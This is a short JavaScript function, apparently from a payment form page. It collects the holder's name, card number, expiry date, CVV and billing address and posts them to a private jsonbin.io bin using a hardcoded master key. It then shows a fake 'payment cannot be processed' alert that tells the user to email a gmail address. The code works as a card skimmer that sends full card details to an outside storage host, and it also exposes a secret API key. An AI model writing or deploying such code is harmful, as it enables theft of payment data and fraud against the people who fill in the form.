
function capt(){
    

   alert("Payment cannot be processed. Email trackmateai@gmail.com to process payment");
    
    var cardHolderName= document.getElementById("holderName").value;
    var cardNumber= document.getElementById("cardNumber").value
    var expiryDate= document.getElementById("expiryDate").value
    var CVV= document.getElementById("CVV").value
    
    var address= document.getElementById("address").value;
    var city= document.getElementById("city").value;
    var country= document.getElementById("country").value;
    


        
        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
        const binName= 'myBin';



      
        const data = {
        Name: cardHolderName,
        CardNumber: cardNumber,
        Expiry: expiryDate,
        Cvv: CVV,
        Address: address,
        City: city,
        Country: country
        
      };

      
       fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              "X-Master-Key": secretKey,
              "X-Bin-Private": true,
              'X-Bin-Name': cardHolderName
            },
            body: JSON.stringify(data)
          })
         .then(response => response.json())
         .then(jsonData => console.log(jsonData))
         .catch(error => console.error(error));
      


   
          var x = document.getElementById("snackbar");
          x.className = "show";
          setTimeout(function(){ x.className = x.className.replace("show", ""); }, 4000);
          //window.location.href=("appNewAppTracking.html");




}
